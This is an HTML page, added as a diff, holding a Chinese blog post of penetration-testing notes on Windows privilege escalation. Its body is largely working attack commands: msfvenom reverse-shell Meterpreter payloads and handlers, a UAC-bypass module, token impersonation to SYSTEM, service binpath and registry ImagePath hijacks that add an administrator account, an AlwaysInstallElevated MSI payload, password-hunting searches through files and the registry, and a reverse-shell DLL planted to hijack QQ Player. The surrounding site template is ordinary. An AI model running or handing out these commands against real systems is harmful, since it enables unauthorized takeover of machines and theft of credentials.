@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Phyb0x's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言win提权也是告一段落了，最近一段时间感觉收获不多，人的惰性真可怕！！！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="win提权">
+<meta property="og:url" content="http://yoursite.com/2018/09/22/win%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Phyb0x&#39;s blog">
+<meta property="og:description" content="前言win提权也是告一段落了，最近一段时间感觉收获不多，人的惰性真可怕！！！">
+<meta property="og:image" content="https://i.imgur.com/xm2o9Si.png">
+<meta property="og:image" content="https://i.imgur.com/h8Dl4fK.png">
+<meta property="og:image" content="https://i.imgur.com/OVnJHzP.png">
+<meta property="og:image" content="https://i.imgur.com/WY343Js.png">
+<meta property="og:image" content="https://i.imgur.com/JeHLUTu.png">
+<meta property="og:image" content="https://i.imgur.com/bYINKcE.png">
+<meta property="og:image" content="https://i.imgur.com/blYjSNi.png">
+<meta property="og:image" content="https://i.imgur.com/ItqgxGX.png">
+<meta property="article:published_time" content="2018-09-22T05:11:19.000Z">
+<meta property="article:modified_time" content="2020-01-12T01:11:20.000Z">
+<meta property="article:author" content="Phyb0x">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/xm2o9Si.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/22/win提权/"/>
+
+
+
+
+
+  <title>win提权 | Phyb0x's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/phyb0x" target="_blank" rel="noopener"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Phyb0x's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/22/win%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Phyb0x">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phyb0x's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">win提权</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-22T13:11:19+08:00">
+                2018-09-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>win提权也是告一段落了，最近一段时间感觉收获不多，人的惰性真可怕！！！</p>
+<a id="more"></a>
+
+<h3 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h3><p>在我粗浅的认知里巴西烤肉、pr几乎是我以前对提权的全部手段。。。其实这些都是属于利用漏洞提权。</p>
+<pre><code>winexp集合
+https://github.com/SecWiki/windows-kernel-exploits</code></pre><p>说到这里给大家介绍两款提权补丁对比工具非常方便</p>
+<h4 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h4><p><img src="https://i.imgur.com/xm2o9Si.png" alt=""></p>
+<pre><code>https://www.uedbox.com/poc-patch-comparison-tool/</code></pre><p>红色即为可用漏洞，缺点作者给提供的补丁信息很少需要手动导入更新。</p>
+<h4 id="2、Windows-Exploit-Suggester"><a href="#2、Windows-Exploit-Suggester" class="headerlink" title="2、Windows-Exploit-Suggester"></a>2、Windows-Exploit-Suggester</h4><p>自动更新下载漏洞库，自动比对筛选整理还把exp地址给列出来！！！一目了然</p>
+<p><img src="https://i.imgur.com/h8Dl4fK.png" alt=""></p>
+<p><img src="https://i.imgur.com/OVnJHzP.png" alt=""></p>
+<pre><code>http://netsecurity.51cto.com/art/201704/537108.htm</code></pre><p>(ps:这篇文章最坑的地方是明明是python2的脚本，文章里介绍用python3.3，真尼玛坑装半天环境！linux也有相应的版本。)</p>
+<h5 id="提权实例"><a href="#提权实例" class="headerlink" title="提权实例"></a>提权实例</h5><p>msf生成木马反弹msfshell </p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.19.128 LPORT=444 -f exe -o 444.exe 
+
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST 192.168.19.128 set lport 444</code></pre><p>win10过UAC</p>
+<pre><code>use exploit/windows/local/ask
+set lhost 192.168.19.128
+set lport 444
+set filename win_update.exe 
+set session 1</code></pre><p><img src="https://i.imgur.com/WY343Js.png" alt=""><br>可以看到新的session已经弹回</p>
+<p>msf里自带的bypassuac模块很少不太好用，这里推荐用Empire<br><img src="https://i.imgur.com/JeHLUTu.png" alt=""></p>
+<p>ms16-075提权</p>
+<pre><code>use incognito
+list_tokens -u
+execute -cH -f ./potato.exe
+impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></pre><p><img src="https://i.imgur.com/bYINKcE.png" alt=""><br>提权成功。据说新的 juicy potato更屌(<a href="http://www.freebuf.com/column/181549.html" target="_blank" rel="noopener">http://www.freebuf.com/column/181549.html</a>)</p>
+<h3 id="Windows错误系统配置"><a href="#Windows错误系统配置" class="headerlink" title="Windows错误系统配置"></a>Windows错误系统配置</h3><h4 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h4><p>原理感觉上与win通配符找路径差不多的形式。</p>
+<pre><code>C:\Program.exe
+C:\Program Files\Some.exe
+C:\Program Files\Some Folder\Service.exe</code></pre><p>可以看到程序的执行顺序是以空格为界逐步尝试执行。找到以system权限执行并且带有空格目录的程序，构造木马名字以达到目的。</p>
+<p>看到漏洞原因是开发者没有将文件路径以 “ 包裹，从原理上来说普通用户也是没有修复权限的。</p>
+<pre><code>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\&quot; |findstr/i /v &quot;&quot;&quot;</code></pre><p>查看是否存在漏洞，找其中带有空格目录的就好。因为本地没有这样的漏洞所以就不进行进一步演示了。msf中也有相应的利用模块  trusted_service_path这个模块自动筛选出没有引号包含的服务，并且对列表中第一个服务上传木马重起服务最后删除木马返回提权的session。利用方法很简单不多做介绍。</p>
+<pre><code>https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</code></pre><p>还有这样一款工具自动探测漏洞权限都列好很方便而且被整合到Empire中，可以直接利用。付上使用方法<a href="http://www.heresec.com/index.php/archives/123/" target="_blank" rel="noopener">http://www.heresec.com/index.php/archives/123/</a></p>
+<h4 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h4><p> 事实上就是修改服务二进制文件去以较高权限执行我们的命令。</p>
+<p>检测服务</p>
+<pre><code>accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula</code></pre><p>之后查看服务配置信息</p>
+<pre><code>sc qc 服务名(test)
+sc config test binpath= &quot;net user rottenadmin P@ssword123! /add&quot;
+sc stop test
+ start test
+sc config test binpath= &quot;net localgroup Administrators rottenadmin /add&quot;
+sc stop test
+sc start test</code></pre><p>同样最后我们要把服务改回原样。</p>
+<h4 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h4><p>直接用subinacl/AccessChk检测注册表</p>
+<pre><code>subinacl.exe /keyreg &quot;HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesService&quot; /display
+subinacl.exe /keyreg &quot;HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesVulnerable Service&quot; /display</code></pre><p>如果有写入权限，用我们的恶意文件替换</p>
+<pre><code>reg add &quot;HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesService&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:UsersuserDesktopmalicious.exe&quot; /f
+reg add &quot;HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable Service&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:UsersuserDesktopmalicious.exe&quot; /f</code></pre><p>重起生效，Win server普通用户就有重起权限不过没有重起服务权限。</p>
+<h4 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h4><p>AlwaysInstallElevated是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置，默认关闭。可以通过注册表查询。</p>
+<pre><code>reg query HKCUSOFTWAREPoliciesMicrosoftWindowsInstaller /v AlwaysInstallElevated</code></pre><p>不存在将报错，可以生成msf木马用msiexec在靶机上执行。</p>
+<pre><code>msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msi
+
+msiexec /quiet /qn /i C:programdatarotten.msi</code></pre><h4 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h4><p>主要是信息收集，讲道理以前总听人说信息收集占测试的大部分时间还不太理解，现在服了。</p>
+<p>敏感文件/信息收集 </p>
+<pre><code>unattend.xml
+GPP.xml
+SYSPREP.INF
+sysprep.xml
+其他各种配置文件
+日志文件
+注册表项
+文件如my_passwords.txt，my_passwords.xls等</code></pre><p>cmd</p>
+<pre><code>dir C:\*vnc.ini /s /b /c
+dir C:\ /s /b /c | findstr /sr \*password\*
+findstr /si password \*.txt | \*.xml | \*.ini
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s</code></pre><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>win调用dll文件的时候会按照一定的顺序来</p>
+<pre><code>1. 程序所在目录；
+2. 系统目录；
+3. 16位系统目录；
+4. Windows目录；
+5. 当前目录；
+6. PATH环境变量中的各个目录。</code></pre><p>所以只要把恶意文件放在优先级大于原dll的目录中就会被优先加载。并且微软从VS2003/MFC7.0提供对Satellite DLL的增强支持，程序运行时MFC会寻找最适合本地环境的dll(主要是基于语言以命名规则寻找)</p>
+<pre><code>1.   ExampleFRC.dll（当前用户的界面语言，此例为加拿大法语）；
+2.   ExampleFRA.dll（当前用户的界面语言，不包含子语言，此例为法语（法国））；
+3.   ExampleENU.dll（系统默认的用户界面语言，此例为美国英语）；
+4.   ExampleLOC.dll。</code></pre><p>也就是说中文情况下即使程序目录自带有test.dll，只要我们放入名为testCHS.dll的恶意木马依旧会被程序优先执行。</p>
+<h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h4><p>用QQ影音进行测试，msf生成木马放到QQ影音(ver3.933)目录下。<br>    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.184.130 LPORT=1234 -a x86 -f dll &gt; quserex.dll</p>
+<p>双击QQPlayer.exe会调用程序目录中不存在的quserex.dll，而我们把同名木马上传到程序目录中，根据dll调用加载顺序会先调用我们的恶意木马达到攻击目的。<br><img src="https://i.imgur.com/blYjSNi.png" alt=""><br><img src="https://i.imgur.com/ItqgxGX.png" alt=""></p>
+<p>这里也是踩了几个坑，我换了三个版本的系统才成功，不过按理来说与win版本应该是没多大关系，可能是一些环境问题。还有就是dll劫持不能劫持一些程序启动必要的dll，否则程序启动失败也是GG。有兴趣的也可以尝试下quserex.dll、quserexchs.dll的优先级顺序。</p>
+<p>附上安装包及视频教程</p>
+<pre><code>链接：https://pan.baidu.com/s/1QYyNZtCZY0Ra8PYGTVTpbg 密码：l7tg</code></pre><p>参考链接：</p>
+<p><a href="https://www.anquanke.com/post/id/87011" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87011</a><br><a href="http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/5061.html" target="_blank" rel="noopener">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/5061.html</a><br><a href="https://blog.csdn.net/tianyazm/article/details/78774602" target="_blank" rel="noopener">https://blog.csdn.net/tianyazm/article/details/78774602</a><br><a href="http://www.freebuf.com/articles/system/131388.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/131388.html</a><br><a href="http://www.freebuf.com/vuls/87463.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/87463.html</a><br><a href="http://www.myh0st.cn/index.php/archives/245/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/245/</a><br><a href="http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html" target="_blank" rel="noopener">http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/20" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/20</a><br><a href="https://www.anquanke.com/post/id/83229" target="_blank" rel="noopener">https://www.anquanke.com/post/id/83229</a><br><a href="http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/" target="_blank" rel="noopener">http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/</a><br><a href="https://www.secpulse.com/archives/19691.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/19691.html</a><br><a href="http://www.cnblogs.com/hkleak/p/5155284.html" target="_blank" rel="noopener">http://www.cnblogs.com/hkleak/p/5155284.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>文章作者:</span><a href="/" title="访问 Phyb0x 的个人博客">Phyb0x</a></p>
+  <p><span>最后更新:</span>2020年01月12日 09:01:20</p>
+  <p><span>原始链接:</span><a href="/2018/09/22/win%E6%8F%90%E6%9D%83/" title="win提权">http://yoursite.com/2018/09/22/win%E6%8F%90%E6%9D%83/</a></p>
+  <p><span>版权声明:</span>本博客所有文章除特别声明外，均采用 <i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" title="Attribution-NonCommercial-ShareAlike 3.0 Unported (CC BY-NC-SA 3.0)"> BY-NC-SA 3.0 许可协议</a>，转载请注明出处！</p>  
+</div>
+
+      
+    </div>
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>万一有人点了呢！</div>
+  <button id="rewardButton" disable="enable" style="width: 80px;line-height: 38px;text-align: center;font-weight: bold;color: #fff;border-radius: 5px;
+margin:0 20px 20px 0;position: relative;overflow: hidden;color: #8c96a0;text-shadow:1px 1px 1px #fff;border:1px solid #dce1e6;box-shadow: 0 1px 2px #fff inset,0 -1px 0 #a8abae inset;background: -webkit-linear-gradient(top,#f2f3f7,#e4e8ec);background: -moz-linear-gradient(top,#f2f3f7,#e4e8ec);background: linear-gradient(top,#f2f3f7,#e4e8ec);" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    打赏
+  </button>
+  <div id="QR" style="display: none;">
+    
+      <div id="wechat" style="display: inline-block;width:150px;height:150px">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Phyb0x WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+    
+    
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/18/linux%E7%9B%AE%E6%A0%87%E6%B5%8B%E8%AF%95%E4%BA%8C/" rel="next" title="linux目标测试二">
+                <i class="fa fa-chevron-left"></i> linux目标测试二
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/02/phpcms9-6-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="phpcms9.6.0漏洞分析">
+                phpcms9.6.0漏洞分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg"
+                alt="Phyb0x" />
+            
+              <p class="site-author-name" itemprop="name">Phyb0x</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nbsec.xyz/" title="大熊's Blog" target="_blank">大熊's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura's Blog" target="_blank">a3ura's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a-running-snail2333.github.io/blog.github.io/" title="a-running-snail's Blog" target="_blank">a-running-snail's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞提权"><span class="nav-number">2.</span> <span class="nav-text">漏洞提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、"><span class="nav-number">2.1.</span> <span class="nav-text">1、</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、Windows-Exploit-Suggester"><span class="nav-number">2.2.</span> <span class="nav-text">2、Windows-Exploit-Suggester</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#提权实例"><span class="nav-number">2.2.1.</span> <span class="nav-text">提权实例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows错误系统配置"><span class="nav-number">3.</span> <span class="nav-text">Windows错误系统配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Trusted-Service-Paths"><span class="nav-number">3.1.</span> <span class="nav-text">Trusted Service Paths</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Vulnerable-Services"><span class="nav-number">3.2.</span> <span class="nav-text">Vulnerable Services</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修改注册表"><span class="nav-number">3.3.</span> <span class="nav-text">修改注册表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AlwaysInstallElevated"><span class="nav-number">3.4.</span> <span class="nav-text">AlwaysInstallElevated</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#凭证窃取"><span class="nav-number">3.5.</span> <span class="nav-text">凭证窃取</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL劫持"><span class="nav-number">4.</span> <span class="nav-text">DLL劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#实例演示"><span class="nav-number">4.1.</span> <span class="nav-text">实例演示</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Phyb0x</span>
+
+  <div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  </div>
+
+  
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
